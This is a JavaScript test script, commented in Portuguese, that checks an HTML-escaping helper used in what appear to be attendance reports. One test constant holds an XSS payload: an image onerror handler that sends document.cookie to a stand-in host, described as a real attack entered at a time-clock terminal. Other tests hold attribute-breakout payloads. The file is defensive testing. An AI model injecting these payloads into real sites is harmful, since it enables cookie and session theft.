// Portao de src/utils/htmlSeguro.ts.
//
// Roda:  npx tsc src/utils/htmlSeguro.ts --outDir scratchpad/_sim --module esnext \
//          --target es2020 --moduleResolution bundler
//        node scratchpad/sim_html_seguro.mjs
//
// (o script transpila sozinho se o .js ainda nao existir)
import { execSync } from 'node:child_process'
import fs from 'node:fs'

const OUT = 'scratchpad/_sim/htmlSeguro.js'
if (!fs.existsSync(OUT) || fs.statSync('src/utils/htmlSeguro.ts').mtimeMs > fs.statSync(OUT).mtimeMs) {
  execSync('npx tsc src/utils/htmlSeguro.ts --outDir scratchpad/_sim --module esnext --target es2020 --moduleResolution bundler', { stdio: 'inherit' })
}
const { h, raw, escaparHtml } = await import('./_sim/htmlSeguro.js')

const casos = []
const caso = (nome, real, esperado) => casos.push({ nome, real, esperado, ok: real === esperado })

// ── escape basico
caso('< e > viram entidade', escaparHtml('<b>'), '&lt;b&gt;')
caso('& e escapado UMA vez (nao vira &amp;lt;)', escaparHtml('<'), '&lt;')
caso('& literal vira &amp;', escaparHtml('a & b'), 'a &amp; b')
caso('aspas duplas', escaparHtml('a"b'), 'a&quot;b')
caso('aspas simples', escaparHtml("a'b"), 'a&#39;b')
caso('crase', escaparHtml('a`b'), 'a&#96;b')
caso('null vira vazio', escaparHtml(null), '')
caso('undefined vira vazio', escaparHtml(undefined), '')
caso('numero passa', escaparHtml(42), '42')

// ── o ataque real do achado 6: matricula digitada no terminal de ponto
const ATAQUE = '<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">'
caso('payload do terminal nao vira tag',
  h`<td>${ATAQUE}</td>`.toString(),
  '<td>&lt;img src=x onerror=&quot;fetch(&#39;//evil/?c=&#39;+document.cookie)&quot;&gt;</td>')

caso('payload nao contem < nem > apos escape',
  /[<>]/.test(h`<td>${ATAQUE}</td>`.toString().replace(/<\/?td>/g, '')),
  false)

// ── quebra de atributo (o caso que so o escape de aspas pega)
caso('nao escapa do atributo com aspas duplas',
  h`<div title="${'" onmouseover="alert(1)'}">`.toString(),
  '<div title="&quot; onmouseover=&quot;alert(1)">')

caso('nao escapa do atributo com aspas simples',
  h`<div title='${"' onmouseover='alert(1)"}'>`.toString(),
  "<div title='&#39; onmouseover=&#39;alert(1)'>")

// ── composicao: h dentro de h passa direto
caso('h aninhado nao e escapado duas vezes',
  h`<table>${h`<tr><td>${'<b>'}</td></tr>`}</table>`.toString(),
  '<table><tr><td>&lt;b&gt;</td></tr></table>')

// ── array de h (o padrao .map())
caso('array de h e concatenado sem escapar',
  h`<tbody>${[h`<tr>${'a'}</tr>`, h`<tr>${'<x>'}</tr>`]}</tbody>`.toString(),
  '<tbody><tr>a</tr><tr>&lt;x&gt;</tr></tbody>')

// ── raw: a unica porta de saida
caso('raw preserva o markup',
  h`<div>${raw('<span class="ok">v</span>')}</div>`.toString(),
  '<div><span class="ok">v</span></div>')

// ── casos que aparecem de verdade nos relatorios e NAO podem ser danificados
caso('classe CSS atravessa intacta',
  h`<td class="${'bg-emerald-100 text-emerald-800'}">`.toString(),
  '<td class="bg-emerald-100 text-emerald-800">')

caso('data formatada atravessa intacta',
  h`<p>${'30/08/2026 14:03:11'}</p>`.toString(),
  '<p>30/08/2026 14:03:11</p>')

caso('ternario que devolve string vazia',
  h`<tr class="${false ? 'x' : ''}">`.toString(),
  '<tr class="">')

// ⚠️ acento NAO pode ser escapado: o relatorio e em portugues e a pagina declara UTF-8.
caso('acentuacao preservada',
  h`<td>${'JOSÉ DA CONCEIÇÃO'}</td>`.toString(),
  '<td>JOSÉ DA CONCEIÇÃO</td>')

// ── JSON do banco (auditoria imprime JSON.stringify(log.detalhes))
caso('JSON com aspas e escapado',
  h`<td>${JSON.stringify({ a: '<b>' })}</td>`.toString(),
  '<td>{&quot;a&quot;:&quot;&lt;b&gt;&quot;}</td>')

let falhas = 0
for (const c of casos) {
  console.log(`  ${c.ok ? 'ok   ' : 'FALHA'}  ${c.nome}`)
  if (!c.ok) {
    falhas++
    console.log(`         esperado: ${JSON.stringify(c.esperado)}`)
    console.log(`         real....: ${JSON.stringify(c.real)}`)
  }
}
console.log(`\n${casos.length - falhas}/${casos.length} casos passaram`)
process.exit(falhas ? 1 : 0)
